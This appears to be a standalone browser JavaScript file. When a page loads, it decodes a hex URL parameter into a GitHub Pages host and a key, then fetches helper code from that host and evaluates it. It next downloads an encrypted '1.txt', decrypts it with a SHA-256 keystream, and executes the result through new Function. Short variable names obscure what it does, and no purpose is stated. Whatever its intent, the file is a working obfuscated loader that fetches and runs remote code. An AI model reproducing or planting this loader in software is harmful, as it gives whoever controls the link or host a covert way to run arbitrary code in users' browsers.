(() => {
  'use strict';

  window.addEventListener('load', () => {
    var url = window.location.href;
    var a = (url.match(/\?a\=([0-9A-F]+)/) || [])[1];
    if(!a || (a.length & 1)) return err();

    a = a.match(/../g).map(a => parseInt(a, 16) ^ 0xff);
    var b = a.splice(0, a.indexOf(0)).map(a => String.fromCharCode(a)).join('');
    var c = a.splice(1);

    var d = 'http://localhost/';
    var e = url.startsWith(d) ? d : `https://${b}.github.io/`;

    (async () => {
      var a = (await r('.')).match(/"([a-z]+\.js)"/)[1];
      a = (await r(a)).match(/'\/([a-z]+\.js)'/)[1];
      a = (await r(a)).split(/\r\n|\r|\n/).filter((a, b, c) => b >= 2 && b <= c.length - 3).join('\n');
      a = new Function(`${a}return ${a[4]}`)();

      var s = (await r(url.split('/').map((a, b, c) => b === c.length - 1 ? '1.txt' : a).join('/'))).match(/[0-9A-Z]{2}/g).map(a => parseInt(a, 16));
      var p = a.sha256(c = a.Buffer.from(c));

      for(var i = 0; i < s.length; i++){
        var j = i & 31;
        s[i] ^= p[j];
        if(j === 31)
          p = a.sha256(a.Buffer.concat([c, p]));
      }

      s = s.map(a => String.fromCharCode(a)).join('');

      try{
        s = new Function(s);
      }catch(a){
        return err();
      }

      s();
    })();

    async function r(a){
      if(!/\/\//.test(a = `${a}`))
        a = e + a;
      return await fetch(a).then(a => a.text());
    }

    function err(msg='Invalid link.'){
      document.body.innerHTML = `<h1>Error</h1>${msg}`;
    }
  });
})();